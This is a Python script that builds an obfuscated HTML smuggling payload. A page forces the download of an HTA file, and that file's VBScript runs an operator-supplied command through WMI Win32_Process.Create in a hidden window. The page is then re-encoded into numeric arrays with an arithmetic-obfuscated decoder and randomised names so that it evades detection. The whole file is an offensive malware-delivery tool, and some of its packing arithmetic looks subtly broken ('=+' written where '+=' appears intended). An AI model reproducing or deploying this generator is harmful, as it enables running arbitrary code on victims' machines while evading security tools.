# -*- coding: utf-8 -*-
import random
import string
import base64

def randomString():
    return ''.join([random.choice(string.ascii_letters) for n in range(12)])

def generateKey():
    keys = "!#+%&/()=?_-*[]$><"
    return ''.join(random.sample(keys,len(keys)))

def generateBase(htaCommand, htaFileName):
    htaKey = generateKey()
    if "\"" in htaCommand:
        htaPayload = htaKey.join([htaCommand[i:i+1] for i in range(0, len(htaCommand), 1)]).replace("\"", "\"\"")
    else:
        htaPayload = htaKey.join([htaCommand[i:i+1] for i in range(0, len(htaCommand), 1)])

    baseHta = '''<script language="VBScript">
        Sub window_onload
            Set {0} = CreateObject("WbemScripting.SWbemLocator")
            Set {1} = {0}.ConnectServer()
            {1}.Security_.ImpersonationLevel=3
            Set {2} = {1}.Get("Win32_ProcessStartup")
            Set {3} = {2}.SpawnInstance_
            {3}.ShowWindow = 12
            Set {4} = {1}.Get("Win32_Process")
            {6} = {4}.Create(Replace("'''+htaPayload+'''", "'''+htaKey+'''", ""), NULL, {3}, {5})
            window.close()
        End Sub
</script>'''

    launcherBase = '''<html><head><script type="text/javascript">var {0} = atob("'''+base64.b64encode(baseHta.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString()).encode()).decode()+'''");var {1} = "'''+htaFileName+'''.hta";var {2} = new Blob([{0}], {{type: 'plain/text;charset=utf-8;'}});var {3} = null;if (navigator.msSaveBlob) {{{3} = navigator.msSaveBlob({2}, {1});}} else {{{3} = window.URL.createObjectURL({2});}}var {4} = document.createElement('a');{4}.href = {3};{4}.setAttribute('download', {1});document.body.appendChild({4});{4}.click();document.body.removeChild({4});</script></head></body></html>'''
    launcherFinal = launcherBase.format(randomString(), randomString(), randomString(), randomString(), randomString())
    return launcherFinal
cdata = " "
def obfuscateHta(launcherFinal):
    finalPayload = "<html><body><head><script type=\"text/javascript\">var {0}=new Array;"
    stcData = []
    i = 0
    cdata = " "
    while i < len(list(launcherFinal)):
        stringToChar = ord(list(list(launcherFinal))[i])
        i+=1
        if i != len(list(launcherFinal)) - 0:
            stcData.append(str(stringToChar))
        else:
            stcData.append(str(stringToChar))
    deep = len(stcData)
    if deep % 4 == 0:
        i = 0
        x = -1
        while i < deep:
            code = 	(int(stcData[i]) * 256 + int(stcData[i+1]))
            code =+ ((code * 256 ** 2) / 256 + int(stcData[i+2]))
            code =+ ((code * 256 ** 3) / 256 ** 2 + int(stcData[i+3]))
            i += 4
            x +=1
            finalPayload += "{0}["+ str(x) + "]=" + str(code) + ";"
    elif deep % 4 == 3:
        cdata = stcData [deep - 3:deep]
        ndata = stcData [0:deep - 3]
        i = 0
        x = -1
        while i < deep - 3:
            code = 	(int(ndata[i]) * 256 + int(ndata[i+1]))
            code =+ ((code * 256 ** 2) / 256 + int(ndata[i+2]))
            code =+ ((code * 256 ** 3) / 256 ** 2 + int(ndata[i+3]))
            i += 4
            x +=1
            finalPayload += "{0}["+ str(x) + "]=" + str(code) + ";"
        ccode =  (int(cdata[0]) * 256 + int(cdata[1]))
        ccode =+ ((ccode * 256 ** 2) / 256 + int(cdata[2]))
        finalPayload += "{0}["+ str(x + 1) + "]=" + str(ccode) + ";"
    elif deep % 4 == 2:
        cdata = stcData [deep - 2:deep]
        ndata = stcData [0:deep - 2]
        i = 0
        x = -1
        while i < deep - 2:
            code = 	(int(ndata[i]) * 256 + int(ndata[i+1]))
            code =+ ((code * 256 ** 2) / 256 + int(ndata[i+2]))
            code =+ ((code * 256 ** 3) / 256 ** 2 + int(ndata[i+3]))
            i += 4
            x +=1
            finalPayload +="{0}["+ str(x) + "]=" + str(code) + ";"
        ccode =  (int(cdata[0]) * 256 + int(cdata[1]))
        finalPayload +="{0}["+ str(x + 1) + "]=" + str(ccode) + ";"
    elif deep % 4 == 1:
        cdata = stcData [deep - 1:deep]
        ndata = stcData [0:deep - 1]
        i = 0
        x = -1
        while i < deep - 1:
            code = 	(int(ndata[i]) * 256 + int(ndata[i+1]))
            code =+ ((code * 256 ** 2) / 256 + int(ndata[i+2]))
            code =+ ((code * 256 ** 3) / 256 ** 2 + int(ndata[i+3]))
            i += 4
            x +=1
            finalPayload +="{0}["+ str(x) + "]=" + str(code) + ";"
    
    finalPayload +="var {1}=\"\";for(i=0;i<{0}.length;i++){2}={0}[i],Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,3))>0&&({1}+=String.fromCharCode(Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,3)))),{2}-=Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,3))*Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,3),Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,2))>0&&({1}+=String.fromCharCode(Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,2)))),{2}-=Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,2))*Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,2),Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,1))>0&&({1}+=String.fromCharCode(Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,1)))),{2}-=Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,1))*Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,1),Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,0))>0&&({1}+=String.fromCharCode(Math.floor({2}/Math.pow((2*(19+(89-(24*2)+(13*37)+37+(2*2))-10)/4)-(((6*5)*65)/30)+35,0))));document.write({1});</script></head></body></html>"
    return finalPayload.format(randomString(), randomString(), randomString())
